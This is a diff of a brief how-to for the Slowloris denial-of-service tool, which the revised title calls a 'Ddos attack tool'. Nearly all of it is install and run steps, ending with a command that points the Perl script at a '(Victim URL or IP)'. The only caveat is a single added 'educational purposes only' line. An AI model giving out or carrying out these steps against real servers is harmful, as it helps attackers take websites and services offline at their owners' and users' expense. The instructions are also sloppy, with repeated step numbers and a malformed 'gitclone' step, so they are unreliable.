@@ -1,21 +1,17 @@
-How use Slowloris
+How use Slowloris (Ddos attack tool)
 
 Requirements:
-# sudo apt-get update  
-# sudo apt-get install perl
-# sudo apt-get install libwww-mechanize-shell-perl
-# sudo apt-get install perl-mechanize
+# sudo apt-get update -y && sudo apt-get install perl libwww-mechanize-shell-perl perl-mechanize
 
-
-1)Download slowloris.pl
+1)Download slowloris.pl 
+# gitclone
 2)Open Terminal
-2)# cd /thePathToYourSlowloris.plFile
+2)# cd /slowloris
 3)# ./slowloris.pl
 4)# perl slowloris.pl -dns (Victim URL or IP) -options
 
-
+educational purposes only
 
 Done
 
-
-Laera Loris
+Rizaldy Christoffel
